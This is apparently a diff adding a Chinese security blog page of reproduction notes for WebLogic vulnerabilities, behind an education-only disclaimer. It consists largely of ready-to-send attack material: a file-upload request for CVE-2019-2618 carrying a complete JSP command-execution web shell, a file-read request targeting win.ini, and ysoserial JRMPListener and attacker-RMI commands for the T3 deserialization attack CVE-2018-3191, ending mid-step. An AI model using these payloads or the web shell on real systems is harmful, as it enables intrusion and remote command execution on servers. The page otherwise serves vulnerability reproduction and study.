@@ -1,0 +1,406 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WebLogic | ascotbe</title><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="声明  郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！ WebLogic漏洞安装注意事项 应该下载的是Generic的安装包   需要指定jdk位置不然他会默认使用jre路径导致安装报错 1java -jar fmw_12.2.1.4.0_wls.jar    管理员用户不能带有特殊字符不然会无法识别     配">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebLogic">
+<meta property="og:url" content="https://www.ascotbe.com/1899/11/30/Cms/WebLogic/index.html">
+<meta property="og:site_name" content="ascotbe">
+<meta property="og:description" content="声明  郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！ WebLogic漏洞安装注意事项 应该下载的是Generic的安装包   需要指定jdk位置不然他会默认使用jre路径导致安装报错 1java -jar fmw_12.2.1.4.0_wls.jar    管理员用户不能带有特殊字符不然会无法识别     配">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/53.jpg">
+<meta property="article:published_time" content="1899-11-29T15:55:00.000Z">
+<meta property="article:modified_time" content="2021-05-17T00:31:53.720Z">
+<meta property="article:author" content="ascotbe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/53.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ascotbe.com/1899/11/30/Cms/WebLogic/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-17 08:31:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="ascotbe" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">102</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.staticdn.net/Ascotbe/Random-img/master/Blog/53.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ascotbe</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WebLogic</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="1899-11-29T15:55:00.000Z" title="发表于 1899-11-30 00:00:43">1899-11-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.720Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>声明</p>
+</blockquote>
+<p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
+<h2 id="WebLogic漏洞"><a href="#WebLogic漏洞" class="headerlink" title="WebLogic漏洞"></a>WebLogic漏洞</h2><h4 id="安装注意事项"><a href="#安装注意事项" class="headerlink" title="安装注意事项"></a>安装注意事项</h4><ul>
+<li><p>应该下载的是<strong>Generic</strong>的安装包</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/7.png" alt="1587109733308"></p>
+</li>
+<li><p>需要指定<code>jdk</code>位置不然他会默认使用<code>jre</code>路径导致安装报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar fmw_12.2.1.4.0_wls.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/1.png" alt="1571724375513"></p>
+</li>
+<li><p>管理员用户不能带有特殊字符不然会无法识别</p>
+</li>
+</ul>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/2.png" alt="1571724461566"></p>
+<ul>
+<li><p>配置完成后，找到<code>startWebLogic.cmd</code>启动<code>weblodgic</code></p>
+</li>
+<li><p><code>startWebLogic.cmd</code>文件双击的话会闪退，需要使用powershell或者cmd来执行，还必须有管理员权限</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/3.png" alt="1571724499667"></p>
+</li>
+<li><p>访问<code>http://127.0.0.1:7001/console</code>验证</p>
+</li>
+</ul>
+<blockquote>
+<p>特别说明：CVE-2018-2628以后的CVE几乎都可以用2628这个CVE的docker进行复现</p>
+<p>需要账号密码的漏洞过于鸡肋</p>
+<p>CVE-2018-3252  (需要账号密码</p>
+<p>CVE-2019-2618  (需要账号密码</p>
+<p>CVE-2018-3245 （py3版本过于鸡肋扫描半年中一次）</p>
+<p>CVE-2020-2551 （无python poc</p>
+<p>CVE-2020-2555 （POC 没法用</p>
+<p>CVE-2020-2883（POC 没法用</p>
+</blockquote>
+<h4 id="0x01-任意文件上传（CVE-2019-2618）"><a href="#0x01-任意文件上传（CVE-2019-2618）" class="headerlink" title="0x01 任意文件上传（CVE-2019-2618）"></a>0x01 任意文件上传（CVE-2019-2618）</h4><h5 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置:"></a>漏洞位置:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bea_wls_deployment_internal&#x2F;DeploymentService</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
+<li><p>版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebLogic 10.3.6.0、12.1.3.0、12.2.1.3</span><br></pre></td></tr></table></figure></li>
+<li><p>注意：需要使用账号密码登录后才能上传文件</p>
+</li>
+<li><p>Windows</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上传路径要修改多加一个\防止转义</span><br><span class="line">\\..\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war</span><br><span class="line">访问shell路径bea_wls_internal\shell.jsp</span><br></pre></td></tr></table></figure></li>
+<li><p>Linux</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接使用如下路径即可</span><br><span class="line">&#x2F;..&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war</span><br><span class="line">访问shell路径bea_wls_internal\shell.jsp</span><br></pre></td></tr></table></figure></li>
+<li><p>Payload拼接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_deployment_internal上传路径举例</span><br><span class="line">-------------------------------------------------------------------------------------</span><br><span class="line">&#x2F;..&#x2F;表示tmp之前的路径</span><br><span class="line">bea_wls_deployment_internal路径后面加6个字符串再加个&#x2F;war拼接后缀</span><br><span class="line">&#x2F;..&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_deployment_internal&#x2F;gyuitk&#x2F;war</span><br></pre></td></tr></table></figure></li>
+<li><p>多目录上传路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;.internal&#x2F;bea_wls_deployment_internal.war</span><br><span class="line">&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;.internal&#x2F;bea_wls_internal.war </span><br><span class="line">&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal</span><br><span class="line">&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_deployment_internal</span><br><span class="line">bea_wls_internal </span><br><span class="line">bea_wls_deployment_internal 在同目录</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式:"></a>请求方式:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure>
+
+<h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bea_wls_deployment_internal/DeploymentService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.143:7001</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.21.0</span><br><span class="line"><span class="attribute">username</span><span class="punctuation">: </span>weblogic</span><br><span class="line">wl_request_type: app_upload</span><br><span class="line">cache-control: no-cache</span><br><span class="line">wl_upload_application_name:\\..\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war</span><br><span class="line">serverName: Ascotbe</span><br><span class="line">password: Zhouyuchen1</span><br><span class="line">content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">archive: true</span><br><span class="line">server_version: 10.3.6.0</span><br><span class="line">wl_upload_delta: true</span><br><span class="line">Content-Length: 1081</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;shell.jsp&quot;; filename=&quot;shell.jsp&quot;</span><br><span class="line">Content-Type: false</span><br><span class="line"></span><br><span class="line"> &lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">%&gt;</span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">Commands with JSP</span><br><span class="line">&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%</span><br><span class="line">if (request.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">    out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;);</span><br><span class="line">    Process p;</span><br><span class="line">    if ( System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) != -1)&#123;</span><br><span class="line">        p = Runtime.getRuntime().exec(&quot;cmd.exe /C &quot; + request.getParameter(&quot;cmd&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    OutputStream os = p.getOutputStream();</span><br><span class="line">    InputStream in = p.getInputStream();</span><br><span class="line">    DataInputStream dis = new DataInputStream(in);</span><br><span class="line">    String disr = dis.readLine();</span><br><span class="line">    while ( disr != null ) &#123;</span><br><span class="line">    out.println(disr);</span><br><span class="line">    disr = dis.readLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt; </span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/4.png" alt="1571726849490"></p>
+<h4 id="0x02-任意文件读取（CVE-2019-2615）"><a href="#0x02-任意文件读取（CVE-2019-2615）" class="headerlink" title="0x02 任意文件读取（CVE-2019-2615）"></a>0x02 任意文件读取（CVE-2019-2615）</h4><h5 id="漏洞位置-1"><a href="#漏洞位置-1" class="headerlink" title="漏洞位置:"></a>漏洞位置:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bea_wls_management_internal2&#x2F;wl_management</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞详情-1"><a href="#漏洞详情-1" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
+<li><p>版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebLogic 10.3.6.0、12.1.3.0、12.2.1.3</span><br></pre></td></tr></table></figure></li>
+<li><p>注意</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要使用账号密码登录后才能上传文件</span><br></pre></td></tr></table></figure></li>
+<li><p>无法读取文件</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">复现的时候遇到了无法读取文件的问题，发送包然后没有任何响应</span><br><span class="line">可以玄学的添加一段cookie代码就能正常访问了</span><br><span class="line">Cookie: ADMINCONSOLESESSION=y5n2b8Y-g339zfpX0Vj2QGbsK0hNBP3LnSa5z4MFK31eZB0ViKEI!-1542757801; hibext_instdsigdipv2=1</span><br></pre></td></tr></table></figure></li>
+<li><p>Linux</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接在adminPath上修改路径&#x2F;root&#x2F;XXXX访问即可</span><br><span class="line">需要注意大小写</span><br></pre></td></tr></table></figure></li>
+<li><p>Windows</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接在adminPath上修改路径即可 ，无需转义</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="请求方式-1"><a href="#请求方式-1" class="headerlink" title="请求方式:"></a>请求方式:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure>
+
+<h5 id="POC-1"><a href="#POC-1" class="headerlink" title="POC:"></a>POC:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;bea_wls_management_internal2&#x2F;wl_management HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.0.147:7001</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;62.0.3202.9 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">username: weblogic</span><br><span class="line">password: XXXXXX</span><br><span class="line">wl_request_type:wl_jsp_refresh_request</span><br><span class="line">adminPath:C:\windows\win.ini</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/5.png" alt="1571810277954"></p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/6.png" alt="1571810330649"></p>
+<h4 id="0x03-远程代码执行（CVE-2018-3191）"><a href="#0x03-远程代码执行（CVE-2018-3191）" class="headerlink" title="0x03  远程代码执行（CVE-2018-3191）"></a>0x03  远程代码执行（CVE-2018-3191）</h4><h5 id="漏洞位置-2"><a href="#漏洞位置-2" class="headerlink" title="漏洞位置:"></a>漏洞位置:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该漏洞是使用T3协议攻击</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞详情-2"><a href="#漏洞详情-2" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
+<li><p>版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WebLogic 10.3.6.0</span><br><span class="line">WebLogic 12.1.3.0</span><br><span class="line">WebLogic 12.2.1.2</span><br><span class="line">WebLogic 12.2.1.3</span><br></pre></td></tr></table></figure></li>
+<li><p>需要的脚本包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br><span class="line">weblogic-spring-jndi-12.2.1.3.jar</span><br><span class="line">weblogic-spring-jndi-10.3.6.0.jar</span><br></pre></td></tr></table></figure></li>
+<li><p>Docker搭建环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull ismaleiva90&#x2F;weblogic12</span><br><span class="line"></span><br><span class="line">docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90&#x2F;weblogic12:latest</span><br><span class="line">http:&#x2F;&#x2F;localhost:49163&#x2F;console</span><br><span class="line">User: weblogic</span><br><span class="line">Pass: welcome1</span><br></pre></td></tr></table></figure></li>
+<li><p>配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开启T3协议（默认开启）</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="请求方式-2"><a href="#请求方式-2" class="headerlink" title="请求方式:"></a>请求方式:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure>
+
+<h5 id="POC-2"><a href="#POC-2" class="headerlink" title="POC:"></a>POC:</h5><ul>
+<li><p><code>payload</code>格式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar weblogic-spring-jndi.jar rmi:<span class="comment">//攻击端ip:端口/Exp &gt; payload.txt</span></span><br></pre></td></tr></table></figure></li>
+<li><p><code>12.2.1.3</code>版本使用下面的工具生成<code>payload</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar weblogic-spring-jndi-<span class="number">12.2</span><span class="number">.1</span><span class="number">.3</span>.jar rmi:<span class="comment">//127.0.0.1:6666/ascotbe &gt;ascotbe.txt</span></span><br></pre></td></tr></table></figure></li>
+<li><p><code>10.3.6.0 </code>、<code>12.2.1.0</code>、 <code>12.1.3.0</code> 、<code>12.2.1.1</code>版本使用下面的工具生成<code>payload</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar  weblogic-spring-jndi-<span class="number">10.3</span><span class="number">.6</span><span class="number">.0</span>.jar rmi:<span class="comment">//127.0.0.1:6666/ascotbe &gt;ascotbe.txt</span></span><br></pre></td></tr></table></figure></li>
+<li><p>攻击者服务器监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-APSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections1 &quot;ping ceye.io&quot;</span><br><span class="line">通过DNSLog验证</span><br></pre></td></tr></table></figure></li>
+<li><p>发送payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic.py 目标主机ip 目标机端口 存放payload的文件</span><br></pre></td></tr></table></figure></li>
+<li><p>受害者服务器开启<code>Docker</code></p>
+</li>
+<li><p>攻击机器1开启命令监听</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener <span class="number">6668</span> CommonsCollections1 <span class="string">&quot;touch /tmp/123.txt&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>攻击机器2开始攻击</p>
